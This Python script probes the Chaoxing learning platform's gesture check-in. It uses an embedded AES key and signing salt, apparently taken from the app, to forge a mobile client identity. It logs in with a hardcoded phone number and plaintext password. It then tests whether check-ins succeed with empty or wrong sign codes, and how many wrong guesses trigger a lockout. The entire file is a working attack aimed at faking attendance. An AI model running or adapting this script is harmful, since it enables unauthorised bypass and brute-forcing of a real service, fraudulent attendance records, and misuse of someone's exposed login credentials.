#!/usr/bin/env python3
"""
手势签到爆破调研 Step3:
A. 最新活动(5000173244801): 直签测试 — stuSignajax空/错signCode是否能绕过手势校验
B. 中间活动(5000173244790): checkSignCode锁定机制测试 — 错误次数阈值、锁定范围
"""
import base64, hashlib, json, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
BASE = "https://mobilelearn.chaoxing.com"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s, puid

AJAX_HDR = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded"}

s_s, puid_s = login("18436633997", "3.1415926Cpy")
print(f"学生puid={puid_s}\n")

AID_A = "5000173244801"  # 最新 — 直签测试
AID_B = "5000173244790"  # 锁定机制测试

def check_sign_code(s, aid, code):
    """手势校验接口"""
    r = s.post(f"{BASE}/widget/sign/pcStuSignController/checkSignCode",
               data={"activeId": aid, "signCode": code}, headers=AJAX_HDR, timeout=15)
    try:
        return r.status_code, r.json()
    except:
        return r.status_code, r.text[:200]

def stu_sign(s, aid, code=""):
    """实际签到接口"""
    r = s.post(f"{BASE}/pptSign/stuSignajax",
               data={"activeId": aid, "courseId": COURSE_ID, "uid": puid_s, "clientip": "",
                     "latitude": "-1", "longitude": "-1", "appType": "15", "fid": "0",
                     "signCode": code}, headers=AJAX_HDR, timeout=15)
    return r.text[:250]

# ============ Test A: 直签测试（最新活动，不先触发锁定） ============
print("=" * 70)
print("Test A: stuSignajax 直签测试（不经过checkSignCode）")
print("=" * 70)
for desc, code in [("空signCode", ""), ("错误signCode", "987654321"), ("短signCode", "12")]:
    text = stu_sign(s_s, AID_A, code)
    print(f"  [{desc}]: {text}")
    if "成功" in text or re.search(r'\bsuccess\b', text, re.I):
        print("  *** 直签成功！stuSignajax不校验手势码 ***")
        break
    time.sleep(0.3)

# ============ Test B: checkSignCode 锁定机制 ============
print(f"\n{'=' * 70}")
print(f"Test B: checkSignCode 错误次数与锁定阈值")
print("=" * 70)
for i in range(1, 12):
    code = "111" + str(i % 10) + str((i * 7) % 10)  # 各种错误码
    sc, resp = check_sign_code(s_s, AID_B, code)
    print(f"  尝试{i}: signCode={code} → HTTP {sc} {json.dumps(resp, ensure_ascii=False)[:120] if isinstance(resp, dict) else resp}")
    if isinstance(resp, dict) and resp.get("result") == -1:
        print(f"  *** 触发锁定: {resp} ***")
        break
    time.sleep(0.4)

# 锁定后再试一次正确格式
sc, resp = check_sign_code(s_s, AID_B, "123456")
print(f"  锁定后尝试: HTTP {sc} {json.dumps(resp, ensure_ascii=False)[:150] if isinstance(resp, dict) else resp}")
